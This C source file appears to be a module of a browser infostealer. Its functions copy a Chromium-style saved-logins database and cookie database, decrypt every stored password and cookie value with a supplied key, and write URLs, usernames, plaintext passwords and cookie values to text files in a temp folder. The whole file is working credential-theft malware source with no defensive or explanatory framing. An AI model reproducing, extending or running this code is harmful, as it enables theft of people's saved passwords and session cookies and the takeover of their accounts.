#include <stdio.h>
#include <stdlib.h>
#include <../include/sqlite3.h>

#include "../include/decryptor.h"
#include "../include/browser.h"
#include "../include/_strcat.h"
#include "../include/copy.h"


int GetPwdData(unsigned char *key, const char *LoginDbPath, const char *Temp) {
	char *LoginFullPath = _strcat(Temp, "\\Loginvault.db");
	char *OutFileTmp = _strcat(Temp, "\\passwords.txt");

	FILE *OutFilePtr = fopen(OutFileTmp, "a");

	if (copy(LoginDbPath, LoginFullPath) != 0) {
		printf("[ERR] => Pwd database cannot be found\n");
		return 1;
	}

	sqlite3* conn;
	if (sqlite3_open(LoginFullPath, &conn) != SQLITE_OK) {
		printf("[ERR] => Unable to open database: %s\n", sqlite3_errmsg(conn));
		return 1;
	}

	if (conn != NULL) {

		sqlite3_stmt *stmt;
		const char *query = "SELECT action_url, username_value, password_value FROM logins";
		
		if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
			int result;
			
			while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
				const char *url 					= (const char *)sqlite3_column_text(stmt, 0);
				const char *username 				= (const char *)sqlite3_column_text(stmt, 1);
				unsigned char *EncryptedValue 		= (unsigned char *)sqlite3_column_blob(stmt, 2);
				int size 							= sqlite3_column_bytes(stmt, 2);

				if (EncryptedValue != NULL) {
					unsigned char *PlainPassword = DataDecryptor(EncryptedValue, size, key);

					fprintf(
						OutFilePtr,
						"URL: %s\n"
						"Username: %s\n"
						"Password: %s\n\n\n",
						url, username, PlainPassword
					);

					free(PlainPassword);
				}
			}
			sqlite3_finalize(stmt);
		} else {
			printf("[ERR] => Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
			return 1;
		}
	} else {
		return 1;
	}

	sqlite3_close(conn);
	fclose(OutFilePtr);
	free(LoginFullPath);
	free(OutFileTmp);

	return 0;
}


int GetCookieData(unsigned char *key, const char *CookiesDbPath, const char *Temp) {
	char *CookiesFullPath = _strcat(Temp, "\\Cookies.db");
	char *OutFileTmp = _strcat(Temp, "\\cookies.txt");

	FILE *OutFilePtr = fopen(OutFileTmp, "a");

	if (copy(CookiesDbPath, CookiesFullPath) != 0) {
		printf("[ERR] => Cookies database cannot be found\n");
		return 1;
	}

	sqlite3* conn;

	if (sqlite3_open(CookiesFullPath, &conn) != SQLITE_OK) {
		printf("[ERR] => Unable to open database: %s\n", sqlite3_errmsg(conn));
		return 1;
	}

	if (conn != NULL) {

		sqlite3_stmt *stmt;
		const char *query = "SELECT host_key, name, encrypted_value FROM cookies";
		
		if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
			int result;
			
			while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
				const char *url 					= (const char *)sqlite3_column_text(stmt, 0);
				const char *name 					= (const char *)sqlite3_column_text(stmt, 1);
				unsigned char *EncryptedValue 		= (unsigned char *)sqlite3_column_blob(stmt, 2);
				int size 							= sqlite3_column_bytes(stmt, 2);

				if (EncryptedValue != NULL) {
					unsigned char *PlainCookie = DataDecryptor(EncryptedValue, size, key);
					fprintf(
						OutFilePtr,
						"URL: %s\n"
						"Name: %s\n"
						"Value: %s\n\n\n",
						url, name, PlainCookie
					);

					free(PlainCookie);
				}
			}
			sqlite3_finalize(stmt);
		} else {
			printf("[ERR] => Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
			return 1;
		}
	} else {
		return 1;
	}

	sqlite3_close(conn);
	fclose(OutFilePtr);
	free(CookiesFullPath);
	free(OutFileTmp);

	return 0;
}